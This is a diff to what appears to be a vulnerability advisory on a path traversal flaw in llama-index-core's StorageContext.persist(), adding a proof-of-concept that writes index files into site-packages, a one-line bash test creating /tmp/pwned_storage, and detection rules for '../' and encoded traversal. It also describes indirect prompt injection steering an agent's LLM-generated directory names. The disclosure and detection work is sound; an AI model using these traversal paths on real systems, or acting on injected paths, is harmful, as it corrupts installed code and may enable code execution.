@@ -102,6 +102,8 @@ When a developer or AI agent saves state, they execute:
 
 Because `StorageContext` passes caller-supplied paths directly to its underlying key-value store without boundary checking, any application saving index state from an untrusted context (e.g., a user session ID or an LLM-generated directory name) is instantly vulnerable to directory traversal. This transforms a low-level framework bug into a highly exploitable real-world vulnerability.
 
+> **This is the vector that matters most in production.** Developers rarely call `SimpleKVStore.persist()` directly. They call `StorageContext.persist()` — and that call hands untrusted paths straight to the unpatched sink.
+
 #### **1.4 The Agentic Attack Vector: LLMs as Proxies**
 In modern agentic architectures, developers rarely hardcode user input directly into file paths. Instead, they rely on the LLM to dynamically generate metadata, project names, or workspace directories based on context. This introduces a new attack surface: **Indirect Prompt Injection leading to Path Traversal.**
 
@@ -322,7 +324,7 @@ The following scripts were uploaded to the project repository and utilized to ve
 ---
 
 #### **Appendix 2: Manual Remediation & Path Anchoring**
-If your environment cannot be updated to `v0.14.21` (or if you are building custom AI agents), you must implement manual **Path Anchoring**.
+Because no patched version of `llama-index-core` exists — v0.14.20 and v0.14.21+ still contain the unpatched `SimpleKVStore.persist()` sink — you **must** implement manual **Path Anchoring** regardless of your framework version.
 
 **Secure Implementation Pattern:**
 ```python
@@ -373,6 +375,21 @@ with patch("llama_index.core.download.dataset.get_file_content") as mock_get, \
         print(f"[!] VULNERABILITY CONFIRMED: Writing to {mock_open.call_args[0][0]}")
 ```
 
+```python
+# Proof of Concept: StorageContext.persist() -> SimpleKVStore.persist()
+from llama_index.core import StorageContext
+from llama_index.core.storage.docstore import SimpleDocumentStore
+
+# Attacker-controlled path (e.g., from LLM output / prompt injection)
+malicious_path = "../../../../usr/local/lib/python3.11/site-packages/llama_index/core/"
+
+storage_context = StorageContext.from_defaults()
+storage_context.persist(persist_dir=malicious_path)
+
+# Result: LlamaIndex writes JSON state files into site-packages,
+# causing persistent DoS or potential RCE if combined with other files.
+```
+
 ---
 
 #### **Appendix 4: Detection & Mitigation Checklist**
@@ -381,6 +398,9 @@ with patch("llama_index.core.download.dataset.get_file_content") as mock_get, \
 - Monitor for `SimpleKVStore.persist()` calls with suspicious paths or directory traversal patterns (`../`).
 - Watch for `download_dataset_and_source_files()` with traversal patterns.
 - Audit any unexpected file writes or modifications to Python's `site-packages` directory.
+- Monitor for `StorageContext.persist(persist_dir=...)` calls where `persist_dir` is derived from LLM output, user input, or any untrusted source.
+- Trace every `StorageContext.persist()` call to its underlying `SimpleKVStore.persist()` invocation and verify the path is anchored to a safe root directory.
+- Watch for `persist_dir` values containing `../`, absolute paths, or encoded traversal variants (`%2e%2e%2f`).
 
 **Immediate Mitigation:**
 1. **WARNING:** Upgrading to the latest version of `llama-index-core` provides **ZERO mitigation** for the `SimpleKVStore.persist()` vector. It remains a fully exploitable zero-day.
@@ -404,6 +424,19 @@ To verify this vulnerability:
    * JSON written to `__init__.py` in site-packages
    * `/tmp/llamaindex_pwned` flag file creation
    * Ability to write to arbitrary directories
+   
+4. Verify the `StorageContext` wrapper is also vulnerable:
+
+   ```bash
+   python3 -c "
+   from llama_index.core import StorageContext
+   sc = StorageContext.from_defaults()
+   sc.persist(persist_dir='../../../../tmp/pwned_storage')
+   print('[+] StorageContext path traversal confirmed: /tmp/pwned_storage created')
+   "
+   ```
+
+   Check for the existence of `/tmp/pwned_storage/` after execution.
 
 ---
 
